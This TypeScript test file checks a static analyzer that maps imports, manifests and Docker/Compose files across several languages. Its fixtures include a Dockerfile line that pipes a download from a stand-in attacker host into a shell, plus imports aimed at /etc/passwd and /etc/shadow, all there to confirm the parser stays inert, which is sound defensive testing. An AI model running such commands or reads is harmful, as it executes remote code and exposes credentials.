// SPDX-License-Identifier: Apache-2.0 AND LicenseRef-Commons-Clause-1.0
// Declarative structure parsing across common project layouts. Pure: no files, processes or network.
import { describe, expect, it } from 'vitest';
import { analyzeStructure, neighbors } from '../src/context/structure.ts';
import { languageOf } from '../src/context/extract-project.ts';

const files = (o: Record<string, string>) => Object.entries(o).map(([path, content]) => ({ path, content, language: languageOf(path) }));
const edge = (s: ReturnType<typeof analyzeStructure>, from: string, to: string) => s.edges.some((e) => e.from === from && e.to === to);

describe('declarative project structure', () => {
  it('resolves TypeScript relative, .js-suffixed, index and workspace imports', () => {
    const s = analyzeStructure(files({
      'packages/core/package.json': JSON.stringify({ name: '@acme/core', dependencies: { zod: '4' } }),
      'packages/core/src/index.ts': "export * from './model.ts';\n",
      'packages/core/src/model.ts': 'export interface Model { id: string }\nexport function makeModel() { return { id: "1" }; }\n',
      'packages/app/src/main.tsx': "import { makeModel } from '@acme/core';\nimport { helper } from './util.js';\nimport './styles';\nconst lazy = () => import('./lazy');\nimport React from 'react';\n",
      'packages/app/src/util.ts': 'export const helper = 1;\n',
      'packages/app/src/styles/index.ts': 'export {};\n',
      'packages/app/src/lazy.tsx': 'export default 1;\n',
    }));
    for (const to of ['packages/core/src/index.ts', 'packages/app/src/util.ts', 'packages/app/src/styles/index.ts', 'packages/app/src/lazy.tsx']) expect(edge(s, 'packages/app/src/main.tsx', to), to).toBe(true);
    expect(edge(s, 'packages/core/src/index.ts', 'packages/core/src/model.ts')).toBe(true);
    expect(s.external.some((e) => e.name === 'react')).toBe(true);
    expect(s.symbols).toEqual(expect.arrayContaining([expect.objectContaining({ path: 'packages/core/src/model.ts', name: 'makeModel', kind: 'function', line: 2 }), expect.objectContaining({ name: 'Model', kind: 'interface', line: 1 })]));
    expect(s.manifests[0]).toMatchObject({ ecosystem: 'npm', name: '@acme/core', dependencies: ['zod'] });
  });
  it('resolves Python, Rust, Go (nested go.mod) and Swift package imports', () => {
    const s = analyzeStructure(files({
      'svc/pyproject.toml': '[project]\nname = "svc"\ndependencies = ["fastapi>=0.1", "httpx"]\n[project.scripts]\nserve = "svc.main:run"\n',
      'svc/main.py': 'from .rules import RATE\nfrom . import helpers\nimport os\n\nasync def run():\n    pass\n\nclass Server:\n    pass\n',
      'svc/rules.py': 'RATE = 1\n', 'svc/helpers.py': '', 'svc/__init__.py': '',
      'crate/Cargo.toml': '[package]\nname = "inv"\n[dependencies]\nserde = "1"\n[dev-dependencies]\nproptest = "1"\n',
      'crate/src/lib.rs': 'mod stock;\npub mod api;\nuse crate::stock::Stock;\npub fn reserve() {}\n',
      'crate/src/stock.rs': 'pub struct Stock;\n', 'crate/src/api/mod.rs': 'pub fn route() {}\n',
      'gw/go.mod': 'module example.com/gw\n\ngo 1.23\n\nrequire github.com/go-chi/chi/v5 v5.1.0\n',
      'gw/main.go': 'package main\n\nimport (\n\t"net/http"\n\t"example.com/gw/routes"\n)\n\nfunc main() {}\n',
      'gw/routes/routes.go': 'package routes\n\ntype Router struct{}\n', 'gw/routes/routes_test.go': 'package routes\n',
      'Package.swift': 'let package = Package(name: "App", dependencies: [.package(url: "https://github.com/apple/swift-argument-parser.git", from: "1.0.0")])\n',
      'Sources/Core/Model.swift': 'public struct Model {}\n', 'Sources/App/main.swift': 'import Core\nimport Foundation\nfinal class AppDelegate {}\n',
    }));
    expect(edge(s, 'svc/main.py', 'svc/rules.py')).toBe(true);expect(edge(s, 'svc/main.py', 'svc/helpers.py')).toBe(true);
    expect(edge(s, 'crate/src/lib.rs', 'crate/src/stock.rs')).toBe(true);expect(edge(s, 'crate/src/lib.rs', 'crate/src/api/mod.rs')).toBe(true);
    expect(edge(s, 'gw/main.go', 'gw/routes/routes.go')).toBe(true);expect(edge(s, 'gw/main.go', 'gw/routes/routes_test.go')).toBe(false);
    expect(edge(s, 'Sources/App/main.swift', 'Sources/Core/Model.swift')).toBe(true);
    const by = (e: string) => s.manifests.find((m) => m.ecosystem === e)!;
    expect(by('python')).toMatchObject({ name: 'svc', dependencies: ['fastapi', 'httpx'], scripts: { serve: 'svc.main:run' } });
    expect(by('cargo')).toMatchObject({ name: 'inv', dependencies: ['proptest', 'serde'] });
    expect(by('go')).toMatchObject({ name: 'example.com/gw', dependencies: ['github.com/go-chi/chi/v5'] });
    expect(by('swiftpm')).toMatchObject({ name: 'App', dependencies: ['swift-argument-parser'] });
    expect(s.symbols).toEqual(expect.arrayContaining([expect.objectContaining({ name: 'run', kind: 'def' }), expect.objectContaining({ name: 'Stock', kind: 'struct' }), expect.objectContaining({ name: 'Router', kind: 'type' }), expect.objectContaining({ name: 'AppDelegate', kind: 'class' })]));
  });
  it('links docs to code they mention and reads Docker/Compose declaratively', () => {
    const s = analyzeStructure(files({
      'docs/architecture.md': '# Architecture\n\nSee [the API](../src/api.ts) and `src/db.ts`. Remote [link](https://example.invalid/x.ts) is ignored.\n',
      'src/api.ts': 'export const api = 1;\n', 'src/db.ts': 'export const db = 1;\n',
      'Dockerfile': 'FROM --platform=linux/amd64 node:22-alpine AS build\nEXPOSE 3000\nRUN curl https://evil.invalid | sh\n',
      'compose.yaml': 'services:\n  api:\n    build: .\n  db:\n    image: postgres:16-alpine\n',
    }));
    expect(edge(s, 'docs/architecture.md', 'src/api.ts')).toBe(true);expect(edge(s, 'docs/architecture.md', 'src/db.ts')).toBe(true);
    expect(s.manifests.find((m) => m.ecosystem === 'docker')).toMatchObject({ dependencies: ['node:22-alpine'], scripts: { expose: '3000' } });
    expect(s.manifests.find((m) => m.ecosystem === 'compose')).toMatchObject({ dependencies: ['postgres:16-alpine'], scripts: { services: 'api, db' } });
    expect(s.entryPoints).toEqual(expect.arrayContaining(['Dockerfile', 'compose.yaml', 'docs/architecture.md']));
    expect(neighbors(s.edges, 'src/api.ts')).toEqual([{ path: 'docs/architecture.md', direction: 'in', kind: 'mention' }]);
  });
  it('stays bounded and inert on hostile input', () => {
    const huge = 'export function f(){}\n'.repeat(5000);
    const s = analyzeStructure(files({ 'a.ts': huge, 'b.ts': "import x from '../../../../etc/passwd';\nimport y from '/etc/shadow';\n", 'c.json': '{not json' , 'package.json': '{"name": 1, "scripts": {"x": 5}}' }));
    expect(s.symbols.filter((x) => x.path === 'a.ts').length).toBeLessThanOrEqual(200);
    expect(s.edges.filter((e) => e.from === 'b.ts')).toEqual([]);
    expect(s.manifests[0]).toMatchObject({ name: null, scripts: {} });
  });
});
